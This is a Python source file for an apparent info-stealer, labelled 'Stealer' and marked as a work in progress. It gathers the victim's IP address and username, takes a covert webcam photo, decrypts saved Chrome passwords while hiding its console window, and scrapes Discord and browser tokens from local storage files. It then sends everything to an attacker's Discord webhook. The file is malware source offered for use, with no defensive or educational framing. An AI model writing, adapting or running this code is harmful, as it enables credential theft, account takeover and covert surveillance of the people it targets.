"""
IN WORK

- 27/feb/2021
"""

import os, time, sys 
try:
    import requests, json, datetime, re, socket, datetime, logging, platform, cv2
    from datetime import date
    from pynput.keyboard import Key, Listener
except:
    print('Unable to import dependencies'); time.sleep(2); sys.exit()

config = {
    "url": 'https://discordapp.com/api/webhooks/..',
    "name": "Stealer",
    "file": []
}

to_do = {
    "ip": True,
    "camera": True,
    "chrome": False,
    "discord": False,
    "pc-name": False
}

def Clear():
    if platform.platform().startswith('Windows'):
	    os.system('cls')
    else:
	    os.system('clear')

def get_pcname():
    if platform.platform().startswith('Windows'):
        return os.getenv('username')
    else:
        return 'os'

def get_ip():
    try:
        return socket.gethostbyname(socket.gethostname()) 
    except:
        return None

def send(url = None, data = None):
    if url is None and config['url'] is None:
	    return None
    if config['name'] is None:
	    name = "default"
    else:
	    name = config['name']
    if url is None or type(url) is not str:
        url = config['url']
    try:
        if type(data) is str:
            r = requests.post(url, headers = {}, json={"content":data, "name": name})
        if type(data) is list:
            new_data = ""
            for each in data:
                new_data+=each+'\n'
            r = requests.post(url, headers = {}, json={"content":new_data, "name": name})
        return r.status_code
    except:
         return False

def get_camera():
    try:
        ret, frame = cv2.VideoCapture(0).read()
        cv2.imwrite('h431gygy81g3f67ga8ft6ahtnj2437tg2gf.png',frame)
        url = config['url']
        files = {'media': open('h431gygy81g3f67ga8ft6ahtnj2437tg2gf.png', 'rb')}
        r = requests.post(url, files=files)
        os.remove('h431gygy81g3f67ga8ft6ahtnj2437tg2gf.png')
    except:
        return False

def extract_passwords():
    if platform.platform().startswith('Windows'):
        try:
            import sqlite3, win32crypt, win32console, win32gui
            win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)
            conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
            cursor = conn.cursor()
            cursor.execute('Select action_url, username_value, password_value FROM logins')
            info = ""
            for result in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
                if password:
                    info+=result[0]+':'+result[1]+str(password)+'\n'
            return info
        except:
            return False
    else:
        return 'os'

def find_tokens():
    if platform.platform().startswith('Windows'):
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            message += f'\n**{platform}**\n```\n'

            path += '\\Local Storage\\leveldb'

            tokens = []

            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue

                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'
        return message
    else:
        return 'os'

if to_do['ip']:
    send(config['url'], str(get_ip()))
if to_do['discord']:
    send(config['url'], str(find_tokens()))
if to_do['chrome']:
    send(config['url'], str(extract_passwords()))
if to_do['camera']:
    get_camera()
if to_do['pc-name']:
    send(config['url'], str(get_pcname()))
